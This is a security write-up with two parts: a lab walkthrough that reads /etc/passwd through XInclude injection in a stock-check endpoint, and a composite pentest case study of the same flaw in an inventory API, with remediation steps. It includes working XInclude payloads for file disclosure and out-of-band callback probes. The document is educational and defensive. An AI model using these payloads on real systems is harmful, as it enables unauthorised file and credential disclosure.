# XInclude Injection: Lab Writeup and Real-World Case Study

## Part 1: Lab Writeup — Retrieving `/etc/passwd` via XInclude Injection

### Objective
Retrieve the contents of `/etc/passwd` from the server within a 10-minute window, without direct filesystem or shell access.

### Initial (Failed) Approach
The first hypothesis was a **path traversal** vulnerability — trying to manipulate a file path parameter to climb out of an intended directory (e.g. `../../../etc/passwd`). This didn't work, which was itself a useful signal: the application likely wasn't handling raw file paths at all, so a different class of vulnerability was worth investigating.

### Discovery via Active Scanning
Running a targeted active scan (Burp Suite Pro) against an endpoint that triggers a backend request surfaced three related findings on a `POST /product/stock` request:

1. **External service interaction** on the endpoint
2. **Out-of-band (OOB) resource load**
3. **Suspicious input transformation: surrogate character replacement**

The request body contained two parameters, `productId` and `storeId`, whose payloads (once URL-decoded) looked like this:

```xml
<nyv xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="http://<collaborator-id>.oastify.com/foo"/>
</nyv>
```

The fact that Burp Collaborator received a DNS/HTTP callback confirmed that these parameter values were being parsed as **XML on the server side**, and specifically that the server's XML parser supported the **XInclude** feature.

### Understanding the Vulnerability: What Is XInclude?

XInclude is a W3C XML specification that lets one XML document pull in content from another resource at parse time, using the `http://www.w3.org/2001/XInclude` namespace and an `<xi:include>` element with an `href` attribute.

This is conceptually similar to (and often confused with) **XXE (XML External Entity) injection**, but it doesn't require a `<!DOCTYPE>` declaration or a `<!ENTITY>` definition — which matters because many applications strip or block `DOCTYPE` as a defense against classic XXE, while leaving XInclude processing enabled. If the backend:

- Takes user-controlled input,
- Embeds it into a larger XML document server-side (rather than parsing the whole request body as XML), and
- Has an XML parser configured to process XInclude directives,

then an attacker can inject an `<xi:include>` element directly into a parameter value, without needing to control the full XML document.

The `href` attribute accepts:
- A **remote URL** — useful for confirming the vulnerability out-of-band (as in this case, via Collaborator), since a blind vulnerability won't reflect data back in the response.
- A **local file path** — the actual exploitation primitive, since the parser will read that file's contents and splice them into the resulting document at that point.

### From Detection to Exploitation

Once OOB interaction confirmed XInclude processing, the exploit path was:

1. **Identify the injection point** — a parameter (here, `productId` or `storeId`) whose value is embedded into server-side XML.
2. **Declare the XInclude namespace** on an element under attacker control.
3. **Point `href` at the target file** instead of a Collaborator URL:

   ```xml
   <xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="/etc/passwd" parse="text"/>
   ```

   The `parse="text"` attribute is important: by default XInclude expects the included resource to itself be well-formed XML. Setting `parse="text"` tells the parser to treat the target as plain text and inline it as character data, which is required for a non-XML file like `/etc/passwd`.
4. **URL-encode the payload** and submit it in the vulnerable parameter.
5. If the application reflects the resulting document (or a derived value) back to the client — e.g. in a stock/availability message — the file contents appear in the HTTP response.

### Why the Initial Path-Traversal Guess Failed
Path traversal targets *file path parameters* consumed directly by filesystem APIs. Here, the actual sink was an *XML parser* consuming attacker-controlled data embedded in a document. No amount of `../` sequences would matter because the vulnerable component wasn't resolving a path string — it was resolving an XML include directive. Recognizing the OOB/Collaborator interaction was the pivot point that redirected the approach from "this is a filesystem bug" to "this is an XML processing bug."

### Key Takeaways
- **OOB interaction is a detection technique, not just a confirmation step.** When input can't be reflected directly, sending a payload that phones home to a listener (Collaborator, an OOB DNS/HTTP service you control) is often the only way to prove a vulnerability exists.
- **XInclude is a lesser-known sibling of XXE.** Defenses that only disable `DOCTYPE`/external entity resolution can still leave XInclude-based file disclosure open.
- **`parse="text"` is the detail that makes non-XML file exfiltration possible.** Without it, the parser expects well-formed XML and the attack fails against arbitrary files.
- Any parameter that gets **assembled into server-side XML**, not just parameters that *are* XML, can be a valid injection point.

---

## Part 2: Real-World Case Study — XInclude Injection in an Internal Inventory Platform

*The following is a realistic composite scenario, illustrating how this vulnerability class manifests and is remediated in production systems, rather than an account of a specific real incident.*

### Background

A mid-sized retail company runs an internal **Inventory & Fulfillment API** used by store point-of-sale terminals and warehouse systems to check stock levels across locations. To support integrations with legacy warehouse management software that only speaks XML, the API's `/inventory/lookup` endpoint accepts form parameters (`sku`, `locationId`) and internally builds an XML request document that it forwards to a downstream **SOAP-based warehouse service**:

```xml
<lookupRequest>
  <sku>{sku}</sku>
  <locationId>{locationId}</locationId>
</lookupRequest>
```

The XML builder used an off-the-shelf Java XML library with default settings, which — unlike many hardened configurations — left both external entity resolution and **XInclude processing enabled**, because a legacy internal service relied on XInclude to pull in shared configuration snippets.

### How the Vulnerability Was Found

During an internal penetration test, the assessment team:

1. Fuzzed all parameters that flowed into any backend system integration, not just user-facing search fields.
2. Noticed the `locationId` parameter was reflected in error messages when malformed, suggesting server-side XML assembly.
3. Injected an XInclude payload referencing an attacker-controlled OOB collaborator-style listener:

   ```
   locationId=<loc xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://<listener-id>.burpcollaborator.net/probe"/></loc>
   ```

4. Received a callback, confirming both XML assembly and active XInclude support.
5. Escalated to local file disclosure using `parse="text"`, successfully retrieving:
   - `/etc/passwd` (proving arbitrary file read)
   - Application configuration files containing **database connection strings and an internal service API key**

### Business Impact

This escalated from a "theoretical XML parsing bug" to a **critical finding** because:
- The leaked database credentials had **read access to customer order history**.
- The internal API key allowed calls to other microservices that trusted network-internal callers without additional authentication (a common "internal network = trusted" assumption).
- Because the vulnerable endpoint was reachable from the store POS network, the blast radius extended beyond the corporate office network to thousands of retail locations.

### Root Cause

- **Untrusted input concatenated into server-side XML** without treating it as data (no proper escaping/encoding for the XML context, and — more fundamentally — no schema restricting what elements/attributes could appear).
- **XML parser misconfiguration**: XInclude and external entity processing were left at library defaults instead of being explicitly disabled.
- **Lack of defense in depth**: a single parsing flaw exposed credentials that then unlocked broader lateral access, because internal services didn't independently authenticate/authorize the caller.

### Remediation

1. **Disable XInclude and external entity resolution** at the parser level unless there is a specific, well-scoped need — e.g. for Java's `DocumentBuilderFactory`:
   ```java
   factory.setXIncludeAware(false);
   factory.setExpandEntityReferences(false);
   factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
   factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
   factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
   ```
2. **Never build XML via string concatenation of user input.** Use a proper XML API (DOM/SAX builder methods, or parameterized templates) so values are inserted as escaped text nodes, not raw markup.
3. **Validate and allowlist input** (e.g. SKUs and location IDs should match a strict format like `^[A-Za-z0-9-]{1,32}$`) before it ever reaches the XML layer — rejecting anything containing `<`, `>`, or namespace-like tokens outright.
4. **Least privilege for the database account** used by the service, so a credential leak doesn't equate to full customer data exposure.
5. **Zero-trust internal service auth** (mutual TLS or short-lived service tokens) so a leaked API key alone isn't sufficient to call other internal services — removing the implicit trust in network location.
6. **Egress filtering / OOB interaction monitoring**: alert on unexpected outbound DNS/HTTP calls from application servers, since OOB callbacks are often the first observable sign of an XXE/XInclude probe in the wild.
7. **Regression test coverage**: add automated tests that submit XInclude/XXE-style payloads to every XML-consuming endpoint as part of CI, so a future library upgrade or refactor can't silently re-enable dangerous defaults.

### Lessons for Defenders
- Any endpoint that assembles XML server-side from user input is a candidate for this class of bug — the attack surface isn't limited to endpoints that explicitly accept a `.xml` file or `Content-Type: application/xml`.
- "We already blocked DOCTYPE" is not sufficient; XInclude is a distinct feature that needs to be disabled independently.
- Credential and secret exposure from a parsing bug is often the pivot point, not the endpoint — the real damage tends to come from what those leaked secrets unlock elsewhere in the environment.
